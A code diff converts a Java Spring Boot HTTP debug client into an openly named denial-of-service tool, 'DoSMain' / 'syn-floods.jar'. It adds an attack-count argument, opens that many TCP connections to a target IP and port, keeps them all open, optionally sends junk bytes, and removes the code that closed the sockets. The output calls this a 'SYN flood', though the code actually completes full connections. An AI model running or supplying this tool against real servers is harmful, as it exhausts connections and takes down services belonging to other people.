@@ -1,6 +1,7 @@
 package com.example;
 
-import java.io.IOException;
+
+import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketAddress;
@@ -13,39 +14,54 @@ import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
 @SpringBootApplication
-public class HTTPTrafficDebugClient implements CommandLineRunner {
+public class DoSMain implements CommandLineRunner {
 
 
 	public static void main(String[] args) {
-		SpringApplication.run(HTTPTrafficDebugClient.class, args);
+		SpringApplication.run(DoSMain.class, args);
 	}
 
 	@Override
 	public void run(String... args) throws Exception {
 		
-		if(args.length != 2) {
-			System.out.println("Run with paramters: java -jar http-client.jar <IP> <Port> <Times>");
+		if(args.length != 3) {
+			System.out.println("Run with paramters: java -jar syn-floods.jar <IP> <Port> <Times>");
 			System.out.println("                    <IP> - Server IP address");
-			System.out.println("                    <Port> - Service Port, like 80, 443, 8080, 8443, etc");
+			System.out.println("                    <Port> - Service Port");
+			System.out.println("                    <Times> - attack times, like 2000, 10000");
 			System.exit(0);
 		}
 		
 		String ip = args[0];
 		int port = Integer.parseInt(args[1]);
+		int times = Integer.parseInt(args[2]);
 		
-		System.out.println("Send 3 http request without GET");
-		
+		boolean isAttack = false;
+		boolean isKeep = true;
+		boolean isClose = false;
 		List<Socket> list = new ArrayList<>();
 		
-		for (int i = 1 ; i <= 3 ; i ++) {
+		for (int i = 1 ; i <= times ; i ++) {
 			
 			SocketAddress address = new InetSocketAddress(ip, port);
 			Socket socket = new Socket();
 			socket.connect(address, 2000);
 			
-			list.add(socket);
+			if(isAttack) {
+				OutputStream out = socket.getOutputStream();
+				out.write("LOL is LOL".getBytes());
+				out.flush();
+			}
 			
-			System.out.println("    http request " + i + ", " + socket.toString());
+			if(isKeep) {
+				list.add(socket);
+			}
+			
+			if(isClose) {
+				socket.close();
+			}
+			
+			System.out.println("SYN flood " + i + "/" + times + ", " + socket.toString());
 		}
 		
 		System.out.println("\nPress \"ENTER\" to continue...");
@@ -53,13 +69,7 @@ public class HTTPTrafficDebugClient implements CommandLineRunner {
 		scanner.nextLine();
 		scanner.close();
 		
-		list.forEach(s -> {
-			try {
-				s.close();
-			} catch (IOException e) {
-				System.err.println(e.getMessage());
-			}
-		});
+	
 		
 	}
 
